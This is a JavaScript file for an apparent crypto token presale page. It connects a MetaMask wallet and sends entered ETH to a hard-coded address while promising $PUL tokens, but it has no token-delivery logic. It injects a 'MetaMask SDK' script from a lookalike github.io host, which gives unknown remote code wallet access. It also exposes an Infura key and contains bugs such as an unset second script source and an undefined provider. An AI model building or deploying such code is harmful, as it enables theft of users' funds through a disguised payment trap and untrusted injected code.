const INFURA_API_KEY = 'ed694c146f2d4a599058ffcd4b087a3f';
const METAMASK_SDK_URL = 'https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js';
const ETHERS_URL = 'https://cdn.ethers.io/lib/ethers-5.2.umd.min.js';
const PUL_RATE = 1000; // 1 ETH = 1000 PUL
let MMSDK;
let connected = false;
let statusDiv;
let connectBtn;
let txStatus;
let ethAmount;
let sendBtn;
let pulAmountDiv;
const RECIPIENT = '0x23DfDD065Fe6Eff0bD4993f29Bf1036912800989';

function injectMetaMaskSDK() {
    return new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = METAMASK_SDK_URL;
        script.onload = resolve;
        script.onerror = reject;
        document.body.appendChild(script);

        const script2 = document.createElement('script');
        script.src = ETHERS_URL;
        script.onload = resolve;
        script.onerror = reject;
        document.body.appendChild(script2);
    });
}

async function initMetaMask() {
    try {
        // SDK henüz yüklenmediyse yükle
        if (!window.MetaMaskSDK) {
            await injectMetaMaskSDK();
        }

        // SDK'yı başlat
        if (!MMSDK) {
            MMSDK = new MetaMaskSDK.MetaMaskSDK({
                dappMetadata: {
                    name: "My Dapp",
                    url: window.location.href
                },
                infuraAPIKey: INFURA_API_KEY,
            });
        }

        await MMSDK.connect();
        const ethereum = MMSDK.getProvider();

        if (typeof ethereum === 'undefined') {
            statusDiv.innerHTML = 'Please install MetaMask!';
            return;
        }

        await setupEventListeners(ethereum);
    } catch (error) {
        console.error('MetaMask initialization failed:', error);
        statusDiv.innerHTML = 'MetaMask initialization failed';
    }
}

async function connectWallet(ethereum) {
    try {
        const accounts = await ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        return accounts[0];
    } catch (error) {
        console.error('Connection failed:', error);
        throw error;
    }
}

function updateStatus(element, message) {
    if (message && message.trim() !== '') {
        //element.textContent = message;
        element.innerHTML = message;
        element.classList.add('visible');
    } else {
        element.innerHTML = '';
        element.classList.remove('visible');
    }
}

async function setupEventListeners(ethereum) {
    try {
        if (!connected) {
            const account = await connectWallet(ethereum);
            updateStatus(statusDiv, `Connected: ${account}`);
            connectBtn.textContent = 'Disconnect';
            connected = true;
            document.getElementById('transactionDiv').style.display = 'block';
        } else {
            updateStatus(statusDiv, 'Disconnected');
            connectBtn.textContent = 'Connect Wallet';
            connected = false;
            document.getElementById('transactionDiv').style.display = 'none';
        }
    } catch (error) {
        console.error(error);
        updateStatus(statusDiv, `Error: ${error.message}`);
    }

    ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
            updateStatus(statusDiv, 'Disconnected');
            connectBtn.textContent = 'Connect Wallet';
            connected = false;
        } else {
            updateStatus(statusDiv, `Connected: ${accounts[0]}`);
        }
    });
}

function calculatePulAmount(ethValue) {
    if (!ethValue || ethValue <= 0) return 0;
    return ethValue * PUL_RATE;
}

function updatePulAmount() {
    const ethValue = parseFloat(ethAmount.value) || 0;
    const pulAmount = calculatePulAmount(ethValue);
    pulAmountDiv.textContent = `${pulAmount.toLocaleString()} $PUL`;
}

async function sendTransaction() {
    try {
        const amount = ethAmount.value;
        if (!amount || amount <= 0) {
            updateStatus(txStatus, 'Please enter a valid amount');
            return;
        }

        const pulAmount = calculatePulAmount(amount);
        
        // Convert ETH to Wei
        const weiAmount = '0x' + (Number(amount) * 1e18).toString(16);
        const accounts = await ethereum.request({ method: 'eth_accounts' });
        
        const transaction = {
            from: accounts[0],
            to: RECIPIENT,
            value: weiAmount
        };

        updateStatus(txStatus, `Sending transaction for ${amount} ETH to receive ${pulAmount} $PUL...`);
        const txHash = await ethereum.request({
            method: 'eth_sendTransaction',
            params: [transaction],
        });

        updateStatus(txStatus, `Transaction sent! Hash: ${txHash}<br>You will receive ${pulAmount} $PUL`);
    } catch (error) {
        console.error('Transaction failed:', error);
        updateStatus(txStatus, `Transaction failed: ${error.message}`);
    }
}

// Define custom elements
function defineCustomElements() {
    customElements.define('w3-input', class extends HTMLElement {
        constructor() {
            super();
            if (this.hasAttribute('eth')) {
                const input = document.createElement('input');
                input.type = 'number';
                input.step = '0.001';
                input.min = '0';
                input.placeholder = 'ETH Amount';
                input.id = 'ethAmount';
                input.className = 'eth-input';
                this.appendChild(input);
            }
        }

        get value() {
            return this.querySelector('input').value;
        }

        set value(val) {
            this.querySelector('input').value = val;
        }
    });

    customElements.define('w3-button', class extends HTMLElement {
        constructor() {
            super();
            if (this.hasAttribute('connect')) {
                this.id = 'connectBtn';
            }
            if (this.hasAttribute('send')) {
                this.id = 'sendBtn';
            }
        }
    });

    customElements.define('w3-status', class extends HTMLElement {
        constructor() {
            super();
            if (this.hasAttribute('main')) {
                this.id = 'status';
            }
            if (this.hasAttribute('tx')) {
                this.id = 'txStatus';
            }
        }
    });

    customElements.define('w3-transaction', class extends HTMLElement {
        constructor() {
            super();
            if (!this.hasAttribute('visible')) {
                this.style.display = 'none';
            }
            this.id = 'transactionDiv';
        }
    });

    customElements.define('w3-amount', class extends HTMLElement {
        constructor() {
            super();
            if (this.hasAttribute('pul')) {
                this.id = 'pulAmount';
                this.textContent = '0 $PUL';
            }
        }
    });

    const simpleElements = ['container', 'title', 'tx-group'];
    simpleElements.forEach(element => {
        customElements.define(`w3-${element}`, class extends HTMLElement {
            constructor() {
                super();
            }
        });
    });
}

// Initialize DOM elements and add event listeners
function initialize() {
    defineCustomElements();
    statusDiv = document.getElementById('status');
    connectBtn = document.getElementById('connectBtn');
    connectBtn.addEventListener('click', initMetaMask);
    txStatus = document.getElementById('txStatus');
    ethAmount = document.getElementById('ethAmount');
    sendBtn = document.getElementById('sendBtn');
    sendBtn.addEventListener('click', sendTransaction);
    pulAmountDiv = document.getElementById('pulAmount');
    ethAmount.addEventListener('input', updatePulAmount);
}

// Wait for DOM to load before initializing
if (document.readyState === 'loading') {
    window.addEventListener('load', initialize);
} else {
    initialize();
}
